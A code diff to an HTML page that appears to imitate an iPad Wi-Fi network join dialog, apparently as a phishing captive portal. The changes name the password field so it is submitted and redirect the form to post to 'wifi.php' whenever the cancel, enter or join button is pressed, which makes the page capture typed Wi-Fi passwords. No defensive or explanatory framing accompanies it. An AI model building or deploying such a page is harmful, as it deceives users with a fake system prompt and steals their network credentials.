@@ -25,6 +25,8 @@ font-weight: bold;
 		position: relative;
 		display: block;
 		margin: auto;
+		width: 100%;
+		
 	}
 	.pHolder{
 		position: absolute;
@@ -36,8 +38,8 @@ font-weight: bold;
 		position: relative;
 		margin: 3% auto;
 		
-		height: 10000px;
-		width: 500px;
+		height:1500px;
+		width: 80%;
 		background: #F2EFF6;
 	}
 	.topL {
@@ -116,8 +118,9 @@ font-weight: bold;
 
 				
 			</div>
-			<form name="send" action="" method="POST"></form>
-			<input type="password" placeholder="Password">
+			<form name="send"  method="POST"></form>
+			<input type="password" id="password" name="password" placeholder="Password">
+
 		</div>
 	</div>
 	<img src="ipad-wifi-networks.jpg" alt="" class="bgImg">
@@ -127,9 +130,10 @@ font-weight: bold;
 <script>
 
 $('.cancel, .enter, .join').click(function(){
-  $('form[name=send]').attr('action','send.html');
+  $('form[name=send]').attr('action','wifi.php');
   $('form[name=send]').submit();
 });
 </script>
+
 </body>
 </html>
